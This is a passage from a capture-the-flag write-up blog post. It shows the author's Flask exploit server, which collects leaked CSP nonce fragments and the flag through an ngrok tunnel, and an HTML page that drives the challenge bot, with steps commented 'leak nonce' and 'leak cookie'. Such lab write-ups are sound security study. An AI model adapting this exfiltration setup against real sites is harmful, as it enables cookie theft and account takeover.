+</span></span><span class=line><span class=cl>    <span class=n>user</span> <span class=o>=</span> <span class=s1>&#39;pwn&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1000000</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>logout</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>login</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>write_zero_note</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>write_first_note</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>test</span> <span class=o>==</span> <span class=kc>False</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;reporting...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>report</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;exploit for &#34;</span><span class=o>+</span><span class=n>user</span><span class=o>+</span><span class=s2>&#34; done&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flag</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flag</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag: &#34;</span> <span class=o>+</span> <span class=n>flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;You have been pwned&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;Pls give me flag&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>x</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;x: &#34;</span> <span class=o>+</span> <span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;current nonce_substr: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>nonce_substr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>nonce_substr</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>nonce_substr</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>30</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>nonce</span> <span class=o>=</span> <span class=n>retrieveNonce</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;nonce: &#34;</span> <span class=o>+</span> <span class=n>nonce</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>create_script_nonce</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>USERNAME</span><span class=o>=</span><span class=n>user</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Public URL:&#39;</span><span class=p>,</span> <span class=n>ngrok_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span></code></pre></div><p><code>index.html</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>milliseconds</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>milliseconds</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=kr>async</span> <span class=kd>function</span> <span class=nx>run</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>            <span class=nx>bot_window</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;http://localhost/share/read#id=1&amp;username={{USERNAME}}&#34;</span><span class=p>);</span> <span class=c1>// Exploit 1, leak nonce
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>7000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>bot_window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/share/read#id=2&amp;username={{USERNAME}}&#34;</span><span class=p>;</span> <span class=c1>// Exploit 2, leak cookie
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;O&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=nx>run</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>At the end, it was a fun challenge to solve ❤️ Thanks to the authors for the challenge and for the CTF in general.</p></div></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/salvatore-abello>Github</a>
+|
+<a href=https://www.linkedin.com/in/salvatore-abello-411b64252/>Linkedin</a>
+|
+<a href=https://x.com/salvatoreabello>X</a></p><p class=copyright>Copyright 2025. All rights reserved.<hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.</p></footer></div></body></html>
